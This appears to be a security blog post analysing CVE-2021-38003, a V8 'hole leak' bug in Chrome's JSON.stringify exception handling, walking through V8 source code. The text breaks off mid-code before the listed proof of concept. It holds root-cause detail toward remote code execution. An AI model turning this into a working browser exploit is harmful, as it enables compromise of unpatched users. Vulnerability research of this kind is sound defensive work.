<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CVE-2021-38003 The Hole Leak to RCE - Arzedlab ü™µ</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Inappropriate implementation in V8 in Google Chrome prior to 95.0.4638.69 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/cve-2021-38003-the-hole-leak-to-rce-ed84a7ccd2664916bb597042d3423439/">
  <meta property="og:site_name" content="Arzedlab ü™µ">
  <meta property="og:title" content="CVE-2021-38003 The Hole Leak to RCE">
  <meta property="og:description" content="Inappropriate implementation in V8 in Google Chrome prior to 95.0.4638.69 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-03-30T00:00:00+00:00">
    <meta property="article:tag" content="CVE-2021-38003">
    <meta property="article:tag" content="Hole-Leak">
    <meta property="article:tag" content="V8">
    <meta property="article:tag" content="Javascript">
    <meta property="article:tag" content="Turbofan">
    <meta property="article:tag" content="Compiler">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2021-38003 The Hole Leak to RCE">
  <meta name="twitter:description" content="Inappropriate implementation in V8 in Google Chrome prior to 95.0.4638.69 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.">
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />

	
	

	
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">Arzedlab ü™µ</a>
	</div>
	<nav>
		
		<a href="/">üè† Home</a>
		
		<a href="/posts">üóÇÔ∏è All posts</a>
		
		<a href="/about">üí° About Me</a>
		
		<a href="/papers">üìë Publications</a>
		
		<a href="/tags">üè∑Ô∏è Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">CVE-2021-38003 The Hole Leak to RCE</h1>
			<div class="meta">Posted on Mar 30, 2024</div>
		</div>
		

		
		<div class="toc">
		<strong>Table of contents:</strong>
		<nav id="TableOfContents">
  <ul>
    <li><a href="#exception-handling-in-jsonstringify">Exception Handling in <code>JSON.stringify()</code></a></li>
    <li><a href="#poc">POC</a></li>
  </ul>
</nav>
		</div>

		<section class="body">
			<h1 id="cve-2021-38003--the-hole-leak-to-rce">CVE-2021-38003 | The Hole Leak to RCE</h1>
<table>
  <thead>
      <tr>
          <th><strong>Type Of Vulnerability</strong></th>
          <th>The Hole Leak</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Security Severity</strong></td>
          <td><strong>High</strong></td>
      </tr>
      <tr>
          <td><strong>Effected Components</strong></td>
          <td><strong>Javascript, Turbofan</strong></td>
      </tr>
      <tr>
          <td><strong>Issue Source</strong></td>
          <td><a href="https://issues.chromium.org/issues/40057710">https://issues.chromium.org/issues/40057710</a></td>
      </tr>
      <tr>
          <td><strong>Writeup Source(s)</strong></td>
          <td>None</td>
      </tr>
      <tr>
          <td><strong>Tested Version</strong></td>
          <td>Google Chrome 95.0.4638.54 (Official Build) (x86_64)</td>
      </tr>
      <tr>
          <td><strong>Vulnerable commit</strong></td>
          <td>a4252db3228433fed5c2bdb0fdff9a6b7b638f3b</td>
      </tr>
  </tbody>
</table>
<h1 id="deep-dive-into-vulnerability">Deep Dive Into Vulnerability</h1>
<p>[1] The vulnerability arises as V8 attempts to handle exceptions in <code>JSON.stringify()</code>. If a exception appears in the built-in function, <code>pending_exception_</code> is set by the <code>Isolate::set_pending_exception()</code> method. The calling code then moves to the V8 exception handling mechanism, where the <code>Isolate::pending_exception()</code> member is fetched from the active isolate and the currently active JavaScript exception handler is invoked using it.</p>
<p>[2] Here, the saved <code>pending_exception_</code>  is accessed by <code>Isolate::pending_exception()</code></p>
<h2 id="exception-handling-in-jsonstringify">Exception Handling in <code>JSON.stringify()</code></h2>
<p>The vulnerability happens when V8 tries to handle the exception in¬†<code>JSON.stringify()</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/builtins/builtins-json.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ES6 section 24.3.2 JSON.stringify.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>BUILTIN(JsonStringify) {
</span></span><span style="display:flex;"><span>  HandleScope <span style="color:#50fa7b">scope</span>(isolate);
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object <span style="color:#ff79c6">=</span> args.atOrUndefined(isolate, <span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> replacer <span style="color:#ff79c6">=</span> args.atOrUndefined(isolate, <span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> indent <span style="color:#ff79c6">=</span> args.atOrUndefined(isolate, <span style="color:#bd93f9">3</span>);
</span></span><span style="display:flex;"><span>  RETURN_RESULT_OR_FAILURE(isolate,
</span></span><span style="display:flex;"><span>                           JsonStringify(isolate, object, replacer, indent));
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></div><p>After placing all arguments into <code>JsonStringify</code> and itself as argument of <code>RETURN_RESULT_OR_FAILURE</code> , <code>RETURN_RESULT_OR_FAILURE</code> calls which is main purpose is return result and check exceptions, if exception occurs arise it, otherwise return <code>__result__</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/execution/isolate.h */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">#define RETURN_RESULT_OR_FAILURE(isolate, call)      
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>  <span style="color:#ff79c6">do</span> {                                               
</span></span><span style="display:flex;"><span>    Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> __result__;                       
</span></span><span style="display:flex;"><span>    Isolate<span style="color:#ff79c6">*</span> __isolate__ <span style="color:#ff79c6">=</span> (isolate);                
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>(call).ToHandle(<span style="color:#ff79c6">&amp;</span>__result__)) {             
</span></span><span style="display:flex;"><span>      DCHECK(__isolate__<span style="color:#ff79c6">-&gt;</span>has_pending_exception());  
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">ReadOnlyRoots</span>(__isolate__).exception(); 
</span></span><span style="display:flex;"><span>    }                                                
</span></span><span style="display:flex;"><span>    DCHECK(<span style="color:#ff79c6">!</span>__isolate__<span style="color:#ff79c6">-&gt;</span>has_pending_exception());   
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">*</span>__result__;                              
</span></span><span style="display:flex;"><span>  } <span style="color:#ff79c6">while</span> (<span style="color:#8be9fd;font-style:italic">false</span>) 
</span></span></code></pre></div><p>Above code,<strong><code>call</code></strong> as the second paramentr of <strong><code>RETURN_RESULT_OR_FAILURE</code></strong>  function calls <strong><code>JsonStringify()</code></strong>  function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>MaybeHandle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> JsonStringify(Isolate<span style="color:#ff79c6">*</span> isolate, Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object,
</span></span><span style="display:flex;"><span>                                  Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> replacer, Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> gap) {
</span></span><span style="display:flex;"><span>  JsonStringifier <span style="color:#50fa7b">stringifier</span>(isolate);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> stringifier.Stringify(object, replacer, gap);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, a <strong><code>JsonStringifier</code></strong> object is created using the <strong><code>isolate</code></strong> pointer. This suggests that <strong><code>JsonStringifier</code></strong> is a class, and <strong><code>stringifier</code></strong> is an instance of that class.</p>
<p>This calls the <strong><code>Stringify</code></strong> method of the <strong><code>stringifier</code></strong> object, passing in the <code>object</code>, <code>replacer</code>, and <code>gap</code> parameters.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>MaybeHandle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> JsonStringifier<span style="color:#ff79c6">::</span>Stringify(Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object,
</span></span><span style="display:flex;"><span>                                               Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> replacer,
</span></span><span style="display:flex;"><span>                                               Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> gap) {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>InitializeReplacer(replacer)) <span style="color:#ff79c6">return</span> MaybeHandle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>gap<span style="color:#ff79c6">-&gt;</span>IsUndefined(isolate_) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>InitializeGap(gap)) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> MaybeHandle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  Result result <span style="color:#ff79c6">=</span> SerializeObject(object);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">==</span> UNCHANGED) <span style="color:#ff79c6">return</span> factory()<span style="color:#ff79c6">-&gt;</span>undefined_value();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">==</span> SUCCESS) <span style="color:#ff79c6">return</span> builder_.Finish();
</span></span><span style="display:flex;"><span>  DCHECK(result <span style="color:#ff79c6">==</span> EXCEPTION);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> MaybeHandle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong><code>Stringify</code></strong> method has three possible results, they are <code>UNCHANGED</code> , <code>SUCCESS</code> , and <code>EXCEPTION</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">Result</span> { UNCHANGED, SUCCESS, EXCEPTION };
</span></span></code></pre></div><p>And <code>SerializeObject()</code>  returns as result one of them.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Entry point to serialize the object.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  V8_INLINE Result <span style="color:#50fa7b">SerializeObject</span>(Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> obj) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> Serialize_<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd;font-style:italic">false</span><span style="color:#ff79c6">&gt;</span>(obj, <span style="color:#8be9fd;font-style:italic">false</span>, factory()<span style="color:#ff79c6">-&gt;</span>empty_string());
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>It calls <code>Serialize_()</code> . And then in turn <code>Serialize_()</code>will return one of the above results.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/json/json-stringifier.cc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>JsonStringifier<span style="color:#ff79c6">::</span>Result JsonStringifier<span style="color:#ff79c6">::</span>Serialize_(Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object, 
</span></span><span style="display:flex;"><span>																				   <span style="color:#8be9fd">bool</span> comma, Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> key) {
</span></span><span style="display:flex;"><span>  StackLimitCheck <span style="color:#50fa7b">interrupt_check</span>(isolate_);
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> initial_value <span style="color:#ff79c6">=</span> object;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (interrupt_check.InterruptRequested() <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>      isolate_<span style="color:#ff79c6">-&gt;</span>stack_guard()<span style="color:#ff79c6">-&gt;</span>HandleInterrupts().IsException(isolate_)) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>IsJSReceiver() <span style="color:#ff79c6">||</span> object<span style="color:#ff79c6">-&gt;</span>IsBigInt()) {
</span></span><span style="display:flex;"><span>    ASSIGN_RETURN_ON_EXCEPTION_VALUE(
</span></span><span style="display:flex;"><span>        isolate_, object, ApplyToJsonFunction(object, key), EXCEPTION);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>replacer_function_.is_null()) {
</span></span><span style="display:flex;"><span>    ASSIGN_RETURN_ON_EXCEPTION_VALUE(
</span></span><span style="display:flex;"><span>        isolate_, object, ApplyReplacerFunction(object, key, initial_value),
</span></span><span style="display:flex;"><span>        EXCEPTION);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>IsSmi()) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeSmi</span>(Smi<span style="color:#ff79c6">::</span>cast(<span style="color:#ff79c6">*</span>object));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">switch</span> (HeapObject<span style="color:#ff79c6">::</span>cast(<span style="color:#ff79c6">*</span>object).map().instance_type()) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">HEAP_NUMBER_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeHeapNumber</span>(Handle<span style="color:#ff79c6">&lt;</span>HeapNumber<span style="color:#ff79c6">&gt;::</span>cast(object));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">BIGINT_TYPE</span>:
</span></span><span style="display:flex;"><span>      isolate_<span style="color:#ff79c6">-&gt;</span>Throw(
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">*</span>factory()<span style="color:#ff79c6">-&gt;</span>NewTypeError(MessageTemplate<span style="color:#ff79c6">::</span>kBigIntSerializeJSON));
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">ODDBALL_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">switch</span> (Oddball<span style="color:#ff79c6">::</span>cast(<span style="color:#ff79c6">*</span>object).kind()) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kFalse</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;false&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kTrue</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kNull</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;null&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> UNCHANGED;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">JS_ARRAY_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeJSArray</span>(Handle<span style="color:#ff79c6">&lt;</span>JSArray<span style="color:#ff79c6">&gt;::</span>cast(object), key);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">JS_PRIMITIVE_WRAPPER_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeJSPrimitiveWrapper</span>(
</span></span><span style="display:flex;"><span>          Handle<span style="color:#ff79c6">&lt;</span>JSPrimitiveWrapper<span style="color:#ff79c6">&gt;::</span>cast(object), key);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">SYMBOL_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> UNCHANGED;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>IsString()) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>        SerializeString(Handle<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;::</span>cast(object));
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>      } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>        DCHECK(object<span style="color:#ff79c6">-&gt;</span>IsJSReceiver());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>IsCallable()) <span style="color:#ff79c6">return</span> UNCHANGED;
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Go to slow path for global proxy and objects requiring access checks.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>IsJSProxy()) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeJSProxy</span>(Handle<span style="color:#ff79c6">&lt;</span>JSProxy<span style="color:#ff79c6">&gt;::</span>cast(object), key);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">SerializeJSObject</span>(Handle<span style="color:#ff79c6">&lt;</span>JSObject<span style="color:#ff79c6">&gt;::</span>cast(object), key);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  UNREACHABLE();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When execution comes to the case <strong><code>JS_ARRAY_TYPE</code></strong> within the <strong><code>Serialize_</code></strong> method of the <strong><code>JsonStringifier</code></strong> class, it enters to <strong><code>SerializeJSArray</code></strong> and begins serialize process of array.</p>
<p>Here, ¬†¬†If you look for return <code>EXCEPTION</code>¬†in <code>JsonStringifier::Serialize_()</code> , it returns right before <code>Throw()</code> , <code>Throw()</code> internally¬†¬†calls <code>set_pending_exception()</code>¬†to store the exception¬†in¬†¬†the <code>pending_exception_</code> field.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#bd93f9">1.</span>    isolate_<span style="color:#ff79c6">-&gt;</span>Throw(
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>factory()<span style="color:#ff79c6">-&gt;</span>NewTypeError(MessageTemplate<span style="color:#ff79c6">::</span>kBigIntSerializeJSON));
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">----------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2.</span>   Object Throw(Object exception) { <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">ThrowInternal</span>(exception, <span style="color:#ff79c6">nullptr</span>); }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">----------------------------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3.</span> Object Isolate<span style="color:#ff79c6">::</span>ThrowInternal(Object raw_exception, MessageLocation<span style="color:#ff79c6">*</span> location) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Set the exception being thrown.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  set_pending_exception(<span style="color:#ff79c6">*</span>exception);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">ReadOnlyRoots</span>(heap()).exception();
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">----------------------------------------------------------------------------</span>
</span></span></code></pre></div><p>But there is exception which is returning <code>EXCEPTION</code> without turning into <code>Throw()</code>  method. It is in</p>
<p><code>SerializeArrayLikeSlow()</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>JsonStringifier<span style="color:#ff79c6">::</span>Result JsonStringifier<span style="color:#ff79c6">::</span>SerializeJSArray(
</span></span><span style="display:flex;"><span>    Handle<span style="color:#ff79c6">&lt;</span>JSArray<span style="color:#ff79c6">&gt;</span> object, Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> key) {
</span></span><span style="display:flex;"><span>  HandleScope <span style="color:#50fa7b">handle_scope</span>(isolate_);
</span></span><span style="display:flex;"><span>  Result stack_push <span style="color:#ff79c6">=</span> StackPush(object, key);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (stack_push <span style="color:#ff79c6">!=</span> SUCCESS) <span style="color:#ff79c6">return</span> stack_push;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint32_t</span> length <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  CHECK(object<span style="color:#ff79c6">-&gt;</span>length().ToArrayLength(<span style="color:#ff79c6">&amp;</span>length));
</span></span><span style="display:flex;"><span>  DCHECK(<span style="color:#ff79c6">!</span>object<span style="color:#ff79c6">-&gt;</span>IsAccessCheckNeeded());
</span></span><span style="display:flex;"><span>  builder_.AppendCharacter(<span style="color:#f1fa8c">&#39;[&#39;</span>);
</span></span><span style="display:flex;"><span>  Indent();
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint32_t</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (replacer_function_.is_null()) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">switch</span> (object<span style="color:#ff79c6">-&gt;</span>GetElementsKind()) {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">PACKED_SMI_ELEMENTS</span>: {
</span></span><span style="display:flex;"><span>        Handle<span style="color:#ff79c6">&lt;</span>FixedArray<span style="color:#ff79c6">&gt;</span> elements(FixedArray<span style="color:#ff79c6">::</span>cast(object<span style="color:#ff79c6">-&gt;</span>elements()),
</span></span><span style="display:flex;"><span>                                    isolate_);
</span></span><span style="display:flex;"><span>        StackLimitCheck <span style="color:#50fa7b">interrupt_check</span>(isolate_);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (i <span style="color:#ff79c6">&lt;</span> length) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (interrupt_check.InterruptRequested() <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>              isolate_<span style="color:#ff79c6">-&gt;</span>stack_guard()<span style="color:#ff79c6">-&gt;</span>HandleInterrupts().IsException(
</span></span><span style="display:flex;"><span>                  isolate_)) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          Separator(i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>          SerializeSmi(Smi<span style="color:#ff79c6">::</span>cast(elements<span style="color:#ff79c6">-&gt;</span>get(i)));
</span></span><span style="display:flex;"><span>          i<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
